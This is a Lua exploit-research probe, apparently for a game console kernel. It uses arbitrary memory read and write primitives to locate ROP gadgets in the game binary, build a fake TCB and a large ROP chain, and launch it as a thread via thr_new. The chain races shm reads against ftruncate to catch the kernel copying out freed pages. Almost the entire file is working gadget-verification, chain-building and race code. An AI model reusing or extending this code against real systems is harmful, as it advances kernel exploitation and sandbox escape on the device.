-- CRASH_CLASS: MODERATE
-- PROBE 1530a: race a kernel read FROM a shm vnode against ftruncate shrinking it
--
-- Context: 1529b closed the anon-vm copyin race clean (25.6 MB all zero over
-- 100000 copyins and 20000 op-3 replacements). This probe asks the same
-- question about a DIFFERENT page source: a pager-backed shm object, where the
-- kernel copies shm pages OUT to a user buffer. If ftruncate frees those pages
-- while a read is walking them, the user buffer receives bytes from a page the
-- kernel no longer owns -- a leak with a direct oracle.
--
-- The oracle: the shm is filled with 0x41 and the destination page V is filled
-- with 0x41 too. The main thread truncates the shm to 0 and back to 0x10000,
-- refilling it with 0x41 each round (64 KiB, one write_buffer call). A byte in
-- V that is neither 0x41 (our pattern) nor 0x00 (a fresh zero page after a
-- regrow) is foreign -- it came from memory the kernel had released.
--
-- The child runs read(shmfd, V, 0x1000) in a loop, preceded each time by
-- lseek(shmfd, 0, SEEK_SET) so every read returns real data rather than EOF.
-- lseek is 478 on this platform, not 199 (probes/phase17_new_vectors/388a).
--
-- prior art: probes/phase36_realargs/1529b_copyin_race_shm.lua (native child-ROP harness, packed chain, proven)
-- prior art: probes/phase36_realargs/1528b_native_race_waves.lua (harness; thr_exit(431) frees the slot)
-- prior art: probes/phase23_shm/932b_shm_lifecycle.lua (shm_open 482 + ftruncate 480 + mmap 477 on 14.10)
-- prior art: probes/phase23_shm/933a_shm_unmap_refcount.lua (8 stale mappings unchanged after unlink+close)
-- prior art: probes/phase17_new_vectors/388a_self_header.lua (lseek is 478, SEEK_SET is 0)
-- prior art: probes/phase17_new_vectors/384b_child_write_minimal.lua (child rsp idiom, 431 exit)

print("=== PROBE 1530a: shm read vs ftruncate ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function fa(v)
    if v == nil then return "nil" end
    local h, l = hi_lo(v)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pidv = N(native.fcall_with_rax(stub, 20))
print("fn_addr=" .. fa(stub) .. " pid=" .. pidv)

local sc_mmap   = mk(477)
local sc_593    = mk(593)
local sc_thr    = mk(455)
local sc_shm    = mk(482)
local sc_ftrunc = mk(480)

-- [A] gadgets
print("")
print("[A] gadget verification")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc_593(uint64(0), info) end)
local elo = rd(N(info) + 0x108)
local ehi = rd(N(info) + 0x10C)
if not elo or not ehi then print("ABORT: no eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
local sb0 = N(eboot)
print("eboot=" .. fa(eboot))

local function bytes_at(off, n)
    local out = {}
    for i = 0, n - 1 do
        local w = rd(sb0 + off + (i - (i % 4)))
        if not w then return nil end
        out[i + 1] = math.floor(w / 2 ^ ((i % 4) * 8)) % 256
    end
    return out
end
local function verifies(off, sig)
    local b = bytes_at(off, #sig)
    if not b then return false end
    for i = 1, #sig do if b[i] ~= sig[i] then return false end end
    return true
end

local off_rax, off_rdi, off_rsi, off_rdx, off_ret, off_rsp = nil, nil, nil, nil, nil, nil
if verifies(0x992,    {0x58, 0xC3}) then off_rax = 0x992 end
if verifies(0xC9DFE,  {0x5F, 0xC3}) then off_rdi = 0xC9DFE end
if verifies(0xD77D,   {0x5E, 0xC3}) then off_rsi = 0xD77D end
if verifies(0x3B02D7, {0x5A, 0xC3}) then off_rdx = 0x3B02D7 end
if verifies(0x42,     {0xC3})       then off_ret = 0x42 end
if verifies(0x9A2,    {0x5C, 0xC3}) then off_rsp = 0x9A2 end
print(string.format("  pop_rax=%s pop_rdi=%s pop_rsi=%s pop_rdx=%s ret=%s pop_rsp=%s",
    off_rax and "OK" or "NONE", off_rdi and "OK" or "NONE",
    off_rsi and "OK" or "NONE", off_rdx and "OK" or "NONE",
    off_ret and "OK" or "NONE", off_rsp and "OK" or "NONE"))
if not (off_rax and off_rdi and off_rsi and off_rdx and off_ret) then
    print("ABORT: gadget set incomplete"); return
end
if not off_rsp then
    print("ABORT: pop rsp missing -- the chain cannot be made to loop"); return
end
local g_rax = eboot + off_rax
local g_rsi = eboot + off_rsi
local g_rdx = eboot + off_rdx
local g_ret = eboot + off_ret

-- [B] shm object, its mapping, and the read destination
print("")
print("[B] shm object")
-- Two 16 KiB pages: page 0 is the liveness channel (never freed, refilled with
-- this round's byte) and page 1 is the marker page (filled with 0x41, then
-- released by every truncate).
local SHMSZ = 0x8000
local okf, rfd = pcall(function() return sc_shm(uint64(1), uint64(0x202), uint64(0x180)) end)
local shmfd = okf and N(rfd) or -999
print(string.format("  shm_open(SHM_ANON=1) -> %d", shmfd))
if shmfd < 0 then print("ABORT: no shm fd"); return end
local oktr, rtr = pcall(function() return sc_ftrunc(uint64(shmfd), uint64(SHMSZ)) end)
print(string.format("  ftruncate(%d, %#x) rv=%s", shmfd, SHMSZ, tostring(oktr and N(rtr) or "err")))
if not oktr or N(rtr) ~= 0 then print("ABORT: ftruncate failed"); return end

local smrv = sc_mmap(uint64(0), uint64(SHMSZ), uint64(3), uint64(1), uint64(shmfd), uint64(0))
local SM = N(smrv)
print("  shm mmap -> " .. fa(smrv))
if SM < 0x10000 then print("ABORT: no shm mapping"); return end

local STAMP = string.rep("B", 0x1000)   -- 0x42: the dead-child marker
-- A constant fill byte makes a page released by an earlier shrink byte-identical
-- to a live copy, so the oracle can never see its own object's stale pages.
-- Fill with a different byte every round from a regex-safe alphabet instead.
local SAFE = "abcdefghijklmnopqrstuvwxyz0123456789"
local function round_byte(r) return SAFE:byte((r % #SAFE) + 1) end
-- page 0 gets this round's byte, page 1 gets the constant marker. A stale read
-- of page 1 therefore returns 0x41, which can never be confused with either the
-- live page-0 byte or a fresh zero page.
local function refill(b)
    pcall(function()
        memory.write_buffer(SM, string.rep(string.char(b), 0x4000) .. string.rep("A", 0x4000))
    end)
end
local FIRST = string.byte("A")
refill(FIRST)
-- 381a: a store to an unmapped page is silently swallowed and reports success,
-- so prove the marker page really took the write before racing on it.
local okm, sm = pcall(function() return memory.read_buffer(SM + 0x4000, 0x1000) end)
local marker_ok = okm and type(sm) == "string" and sm == string.rep("A", 0x1000)
print("  marker page readable and 0x41: " .. tostring(marker_ok))
if not marker_ok then print("ABORT: the marker page did not take the fill"); return end

local vrv = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local V = N(vrv)
print("  destination mmap -> " .. fa(vrv))
if V < 0x10000 then print("ABORT: no destination"); return end
-- the destination starts ZERO so that the first successful read is itself the
-- positive control: if V turns 0x41 the child is really copying shm pages out
pcall(function() memory.write_buffer(V, string.rep("\0", 0x4000)) end)
-- W is the leak channel. The child reads page 0 into V (liveness: page 0 is
-- never freed, so V always carries this round's byte) and page 1 into W (the
-- oracle: page 1 is freed every round, so anything but 0x00 in W came from a
-- page the kernel had already released).
local wrv = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local W = N(wrv)
print("  leak channel mmap -> " .. fa(wrv))
if W < 0x10000 then print("ABORT: no leak channel"); return end
pcall(function() memory.write_buffer(W, string.rep("\0", 0x4000)) end)
print("  shm filled with 0x41, both destinations zeroed")

-- [C] child chain: lseek(fd,0,SEEK_SET); read(fd,V,0x1000); repeat
print("")
print("[C] child chain")
local LAPS  = 12000       -- each lap is two lseeks and two reads
local READS = 1
-- 7 qwords per lseek (pop_rsi,0,pop_rdx,0,pop_rax,478,stub)
-- 7 qwords per read  (pop_rsi,V,pop_rdx,0x1000,pop_rax,3,stub)
local nq = 9 + LAPS * 28 + 2
local need = 0x4000 + nq * 8 + 0x1000
local alloc = math.ceil(need / 0x4000) * 0x4000
-- the chain is ~1.9 MB, which is too big for memory.alloc: 1530a's first run
-- faulted 0xD0 bytes into the write_buffer copy (ERRTRAP=0x60E, FAULT=dest+0xD0)
-- because the Lua heap block ended there. An explicit anon mmap is contiguous
-- and its size is exactly what was asked for.
local srv = sc_mmap(uint64(0), uint64(alloc), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sbase = N(srv)
print("  stack mmap -> " .. fa(srv) .. string.format(" need=%d alloc=%d", need, alloc))
if sbase < 0x10000 then print("ABORT: no stack mapping"); return end
local rsp = sbase + 0x4000 - 8

local function packq(v)
    local h, l = hi_lo(v)
    return string.char(l % 256, math.floor(l / 256) % 256,
        math.floor(l / 65536) % 256, math.floor(l / 16777216) % 256,
        h % 256, math.floor(h / 256) % 256,
        math.floor(h / 65536) % 256, math.floor(h / 16777216) % 256)
end
local parts = {}
local function put(v) parts[#parts + 1] = packq(v) end

-- F6 from Review1530a: the syscall stub's error path stores errno through
-- %fs:0, so ONE -1 return kills the child inside libkernel. A pager error
-- while the read walks a page the shrink just released is exactly the event
-- this probe is looking for, and without a TCB it would be reported as a
-- dead child. Install a fake FSBASE first, exactly as 384b does.
-- The TCB goes in page 0 of the same anon stack mapping (rsp is at the END of
-- page 0 and the chain grows upward from there, so page 0 is unused). Doing it
-- with memory.alloc instead hung main before it could even print "chain
-- qwords": the Lua heap was already holding ~168k chain strings.
print("  building TCB")
local tcb = sbase
for i = 0, 0x1FF do wq(tcb + i * 8, uint64(tcb)) end
local fs_ptr = sbase + 0x1000
wq(fs_ptr, uint64(tcb))
print(string.format("  TCB at %#x fs_ptr at %#x", tcb, fs_ptr))

local chain_start = rsp
put(uint64(eboot + off_rdi)); put(uint64(129))          -- AMD64_SET_FSBASE
put(uint64(eboot + off_rsi)); put(uint64(fs_ptr))
put(uint64(eboot + off_rax)); put(uint64(165)); put(uint64(stub))
put(uint64(eboot + off_rdi)); put(uint64(shmfd))
for i = 1, LAPS do
    -- One lap rewinds to offset 0 and reads one whole SHMSZ window. A flat run
    -- of reads would hit EOF after 16 reads and stop touching the pager, and a
    -- pop-rsp restart is not available: Rev1530a2 showed the C syscall stub's
    -- own pushes land on chain qwords, so restarting re-executes slots that
    -- have been overwritten (that is the RIP=0 death at err/trap 0x140e).
    put(g_rsi); put(uint64(0))
    put(g_rdx); put(uint64(0))
    put(g_rax); put(uint64(478)); put(uint64(stub))   -- lseek(fd,0,SEEK_SET)
    -- sequential reads after the rewind: the first lands in V (page 0), the
    -- second in W (page 1, the page the truncate frees).
    put(g_rsi); put(uint64(V))
    put(g_rdx); put(uint64(0x1000))
    put(g_rax); put(uint64(3)); put(uint64(stub))     -- read(fd,V,0x1000)
    -- The page size is 0x4000, so a second 0x1000 read would still land in
    -- page 0 and W would receive the liveness byte (that is exactly the
    -- false positive the first run reported: "0x62 0x62 0x62 0x62 0x62").
    put(g_rsi); put(uint64(0x4000))
    put(g_rdx); put(uint64(0))
    put(g_rax); put(uint64(478)); put(uint64(stub))   -- lseek(fd,0x4000,SEEK_SET)
    put(g_rsi); put(uint64(W))
    put(g_rdx); put(uint64(0x1000))
    put(g_rax); put(uint64(3)); put(uint64(stub))     -- read(fd,W,0x1000)
end
-- The child exits cleanly when the laps are done. It must outlive the main
-- loop: a flat 12000-read chain finished by round 185 of 3000.
put(g_rax); put(uint64(431)); put(uint64(stub))       -- thr_exit(0)
print("  concatenating " .. tostring(#parts) .. " qwords")
local blob = table.concat(parts)
parts = nil
print(string.format("  chain qwords=%d bytes=%d alloc=%d stack=%s",
    #blob / 8, #blob, alloc, fa(uint64(sbase))))
if 0x4000 - 8 + #blob > alloc then
    print(string.format("ABORT: chain %d bytes does not fit %d after rsp+0x3ff8", #blob, alloc))
    return
end
if 0x4000 - 8 + #blob > alloc then
    print(string.format("ABORT: chain %d bytes does not fit %d after rsp+0x3ff8", #blob, alloc))
    return
end
local okw = pcall(function() memory.write_buffer(rsp, blob) end)
if not okw then print("ABORT: chain write failed"); return end
-- A chain that reaches a zero qword rets into address 0 and dies with SIGSEGV
-- at RIP=0 (err/trap 0x140e), which is indistinguishable from a kernel bug in
-- the fault record. Both ends are checked after the write, and a mismatch is
-- fatal rather than a warning.
local okh, head8 = pcall(function() return memory.read_buffer(rsp, 8) end)
local okt, tail8 = pcall(function() return memory.read_buffer(rsp + #blob - 8, 8) end)
local head_ok = okh and type(head8) == "string" and head8 == blob:sub(1, 8)
local tail_ok = okt and type(tail8) == "string" and tail8 == blob:sub(#blob - 7)
print(string.format("  chain write head_ok=%s tail_ok=%s", tostring(head_ok), tostring(tail_ok)))
if not head_ok or not tail_ok then
    print("  ABORT: the chain did not land intact -- a zero qword would ret into 0")
    return
end
blob = nil

local pa = memory.alloc(0x40)
for i = 0, 7 do wq(N(pa) + i * 8, uint64(0)) end
local ctid = memory.alloc(8)
wd(N(ctid), 0)
wq(N(pa) + 0x00, uint64(g_ret))
wq(N(pa) + 0x10, uint64(sbase))
wq(N(pa) + 0x18, uint64(0x4000))
wq(N(pa) + 0x30, uint64(N(ctid)))

-- [D] race: truncate to 0, regrow, refill, sample the destination
print("")
print("[D] race")
local ok_sp, rsp_ = pcall(function() return sc_thr(uint64(N(pa)), uint64(0x38)) end)
print(string.format("  thr_new rv=%s child_tid=%s", tostring(ok_sp and N(rsp_) or "err"), tostring(rd(N(ctid)))))
if not ok_sp or N(rsp_) ~= 0 then print("ABORT: no child"); return end

-- positive control: without the child running, every later "clean" result
-- would be a triply-empty negative
local function spin(n) local x = 0 for i = 1, n do x = x + i % 7 end return x end
spin(200000)
local okc, sc = pcall(function() return memory.read_buffer(V, 0x1000) end)
local ctrl = false
if okc and type(sc) == "string" then
    -- exact match, not a single byte: a partial first read must not pass
    ctrl = (sc == string.rep("A", 0x1000))
end
print(string.format("  positive control: destination turned 0x41 = %s", tostring(ctrl)))
if not ctrl then print("ABORT: the child never copied anything"); return end

local ROUNDS = 60
local CYCLES = 2
local foreign, sampled, firstbad, dead = 0, 0, "", 0
local trunc_fail = 0
-- A failed truncate turns the verdict inside out: a failed shrink leaves the
-- marker page live (false FOREIGN), a failed grow leaves it beyond EOF (false
-- clean). Capture all three return values per cycle.
local function rvtr(fn, len)
    local ok, rv = pcall(function() return fn(uint64(shmfd), uint64(len)) end)
    return ok and N(rv) == 0
end
local liveq = {0, 0, 0, 0}
local quart = math.max(1, math.floor(ROUNDS / 4))
local ZERO = string.rep("\0", 0x1000)
local function sample_once(r, c, b, ch)
    local okv, sv = pcall(function() return memory.read_buffer(V, 0x1000) end)
    local okw, sw = pcall(function() return memory.read_buffer(W, 0x1000) end)
    if not (okv and okw and type(sv) == "string" and type(sw) == "string"
            and #sv == 0x1000 and #sw == 0x1000) then return end
    sampled = sampled + 1
    -- liveness: page 0 is live and carries this round's byte
    if sv:find(ch, 1, true) then
        local q = math.floor((r - 1) / quart) + 1
        if q > 4 then q = 4 end
        liveq[q] = liveq[q] + 1
    else
        dead = dead + 1
    end
    -- oracle: W was cleared AFTER the release and BEFORE the regrow, so the
    -- only way a 0x41 reaches it is a read that returned the pre-truncate
    -- content of a page the kernel had already freed.
    local bad, pos = 0, 1
    while true do
        local q2 = sw:find("[^%z]", pos)
        if not q2 then break end
        bad = bad + 1
        if firstbad == "" then
            local lo = q2 - 4; if lo < 1 then lo = 1 end
            local hi = q2 + 4; if hi > #sw then hi = #sw end
            local hex = {}
            for i = lo, hi do hex[#hex + 1] = string.format("%02X", sw:byte(i)) end
            firstbad = string.format("round %d cycle %d byte %d: %s", r, c, q2, table.concat(hex, " "))
        end
        pos = q2 + 1
        if bad > 64 then break end
    end
    foreign = foreign + bad
end
for r = 1, ROUNDS do
    local b = round_byte(r)
    local ch = string.char(b)
    for c = 1, CYCLES do
        -- arm: two pages, page 0 = b (liveness), page 1 = 0x41 (marker)
        local f1 = rvtr(sc_ftrunc, SHMSZ)
        refill(b)
        -- release the marked page while the child is reading
        local f2 = rvtr(sc_ftrunc, 0x4000)
        -- clear the oracle buffer so a stale copy cannot hide behind an old one
        pcall(function() memory.write_buffer(W, ZERO) end)
        -- regrow: page 1 must now be a fresh zero page
        local f3 = rvtr(sc_ftrunc, SHMSZ)
        if not (f1 and f2 and f3) then trunc_fail = trunc_fail + 1 end
        spin(200)
        sample_once(r, c, b, ch)
    end
    if r % 10 == 0 then
        print(string.format("  round %d sampled=%d dead=%d foreign=%d", r, sampled, dead, foreign))
    end
end
print(string.format("  rounds=%d cycles=%d samples=%d dead=%d foreign_bytes=%d",
    ROUNDS, CYCLES, sampled, dead, foreign))
print(string.format("  child delivered per quarter: %d %d %d %d (of %d each)",
    liveq[1], liveq[2], liveq[3], liveq[4], quart))
if firstbad ~= "" then print("  first foreign: " .. firstbad) end

-- [E] verdict
print("")
print("[E] verdict")
if sampled == 0 then
    print("  VERDICT VOID: the destination page could not be read back")
elseif trunc_fail > 0 then
    print(string.format("  VERDICT VOID: %d of %d cycles had a truncate fail, so neither a",
        trunc_fail, ROUNDS * CYCLES))
    print("  foreign byte nor a clean result from this run means anything")
elseif foreign > 0 then
    print("  *** FOREIGN BYTES IN THE READ DESTINATION ***")
    print("  the kernel copied out of a page it had already released")
elseif dead > 0 then
    print(string.format("  VERDICT VOID: %d of %d samples held no byte from this round, so the",
        dead, sampled))
    print("  child was not delivering for those rounds and they raced nothing")
else
    print(string.format("  clean: %d samples of %#x bytes, %d with no live byte (raced nothing)",
        sampled, 0x1000, dead))
    print("  every other byte is this round's fill byte or 0x00")
end
print("  final pid=" .. tostring(N(native.fcall_with_rax(stub, 20))) .. " expected " .. tostring(pidv))
print("")
print("=== PROBE 1530a COMPLETE ===")
